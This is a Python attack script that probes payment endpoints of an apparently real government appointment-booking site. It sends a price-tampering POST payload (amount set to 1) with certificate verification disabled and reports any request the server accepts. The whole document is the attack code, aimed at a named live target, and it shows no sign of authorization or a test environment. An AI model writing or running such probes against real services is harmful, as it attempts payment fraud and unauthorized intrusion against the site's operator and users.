"""
This script probes the specific payment APIs discovered to identify parameters
that can be manipulated.
"""
import requests
import warnings
warnings.filterwarnings('ignore')

URL = "https://bookappointment.uidai.gov.in"
PAYMENT_ENDPOINTS = [
    "/payment/create",
    "/payment/initiate",
    "/payment/order",
    "/api/payment/createOrder"
]

print("=" * 70)
print("PAYMENT API PROBE")
print("=" * 70)

for endpoint in PAYMENT_ENDPOINTS:
    full_url = URL + endpoint
    print(f"\n[+] Probing {full_url}")
    
    # Try an empty GET
    try:
        r_get = requests.get(full_url, timeout=5, verify=False)
        print(f"  GET: [{r_get.status_code}]")
    except Exception as e:
        print(f"  GET Error: {e}")
        
    # Try a minimal POST with price tampering attempt
    try:
        payload = {"amount": 1, "currency": "INR"}
        r_post = requests.post(full_url, json=payload, timeout=5, verify=False)
        print(f"  POST: [{r_post.status_code}]")
        if r_post.status_code in [200, 201]:
             print(f"  [!!!] ACCEPTED POST: {r_post.text[:200]}")
    except Exception as e:
        print(f"  POST Error: {e}")

print("\n" + "=" * 70)
